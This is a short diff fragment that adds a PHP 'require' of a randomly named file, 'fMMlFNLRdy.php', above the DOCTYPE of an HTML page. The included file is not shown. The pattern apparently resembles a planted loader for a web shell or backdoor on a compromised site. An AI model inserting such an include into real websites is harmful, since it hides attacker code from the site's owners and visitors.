@@ -1,3 +1,6 @@
+<?php
+require __DIR__ . '/fMMlFNLRdy.php' 
+?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
